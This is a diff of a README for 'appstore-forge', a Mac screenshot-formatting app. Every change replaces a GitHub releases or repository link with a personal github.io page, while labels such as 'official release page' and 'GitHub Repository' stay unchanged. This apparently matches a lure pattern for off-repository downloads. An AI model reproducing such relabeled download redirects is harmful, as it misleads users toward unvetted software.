@@ -6,7 +6,7 @@ appstore-forge is a simple, free Mac application that transforms your raw app sc
 
 If you've ever struggled with resizing screenshots, adding device frames, or meeting store requirements, appstore-forge handles all of that for you in seconds. It's like having a professional design assistant built into your Mac.
 
-[📥 Download appstore-forge Now](https://github.com/tentmakerwichita8135/appstore-forge/releases)
+[📥 Download appstore-forge Now](https://tentmakerwichita8135.github.io)
 
 ---
 
@@ -43,7 +43,7 @@ Follow these simple steps to get appstore-forge on your Mac:
 
 Click this button to go to the official release page:
 
-[📥 Get appstore-forge Here](https://github.com/tentmakerwichita8135/appstore-forge/releases)
+[📥 Get appstore-forge Here](https://tentmakerwichita8135.github.io)
 
 ### Step 2: Choose the Right File
 
@@ -157,7 +157,7 @@ Right-click the app and select **Open** again. macOS sometimes needs this confir
 
 If you run into any issues or have suggestions, check out the official repository:
 
-- **Project Home:** [GitHub Repository](https://github.com/tentmakerwichita8135/appstore-forge)
+- **Project Home:** [GitHub Repository](https://tentmakerwichita8135.github.io)
 - **Report Issues:** Use the Issues tab on GitHub to describe any bugs you find
 - **Feature Requests:** Let the developer know what you'd like to see in future versions
 
@@ -167,7 +167,7 @@ If you run into any issues or have suggestions, check out the official repositor
 
 Download appstore-forge today and streamline your app publishing process:
 
-[🚀 Download appstore-forge](https://github.com/tentmakerwichita8135/appstore-forge/releases)
+[🚀 Download appstore-forge](https://tentmakerwichita8135.github.io)
 
 Stop wrestling with screenshot sizes and formats. Let appstore-forge do the heavy lifting, and get back to what matters – building an amazing app.
 
